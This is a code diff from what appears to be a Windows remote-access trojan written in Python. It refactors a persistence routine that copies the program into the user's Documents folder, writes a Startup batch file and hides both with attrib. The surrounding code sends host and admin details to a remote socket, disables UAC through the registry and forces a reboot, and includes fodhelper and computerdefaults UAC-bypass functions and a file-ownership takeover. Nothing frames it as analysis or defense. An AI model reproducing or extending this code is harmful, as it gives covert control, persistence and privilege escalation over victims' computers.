@@ -50,15 +50,19 @@ def connect()->None:
         s.send(dumps({"node":node(),"release":release(),"machine":machine(),"processor":processor(),"admin":windll.shell32.IsUserAnAdmin(),"username":environ.get("username")}))
     except TimeoutError:connect()
     except ConnectionRefusedError:connect()
+def CYS()->None:
+    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ["username"]))
+    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]), "w") as file:
+        file.write("""@Echo off
+start C:\\Users\\{0}\\Documents\\{1}
+exit""".format(environ["username"], basename(argv[0])))
+    run("attrib +s +h +r C:\\Users\\"+environ["username"]+"\\Documents\\"+basename(argv[0]))
+    run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"")
 def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
     SetValueEx(key,"EnableLUA",0,REG_DWORD,0)
     CloseKey(key)
-    copyfile(argv[0],r"C:\Users\{}\Documents\\".format(environ["username"])+basename(argv[0]))
-    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]),"w")as file:
-        file.write("""@Echo off
-start C:\\Users\\{0}\\Documents\\{1}
-exit""".format(environ["username"],basename(argv[0])))
+    CYS()
     call("shutdown /r /f /t 0")
     exit(0)
 def computerdefaults(target:str=argv[0])->None:
@@ -78,13 +82,6 @@ def fodhelper(target:str=argv[0])->None:
     while not process_is_exists(basename(target)):
         call(f"run {target} {ms_reg} fodhelper.exe")
         process_is_exists(basename(target))
-def CYS()->None:
-    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ["username"]))
-    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]), "w") as file:
-        file.write("""@Echo off
-start C:\\Users\\{0}\\Documents\\{1}
-exit""".format(environ["username"], basename(argv[0])))
-    run("attrib +s +h +r C:\\Users\\"+environ["username"]+"\\Documents\\"+basename(argv[0]))
 def FDR(target:str)->None:
     run(f"takeown /D Y /R /F {target}")
     run("icacls {target} /T /C /grant {}:(F,MA)".format(environ["username"]))
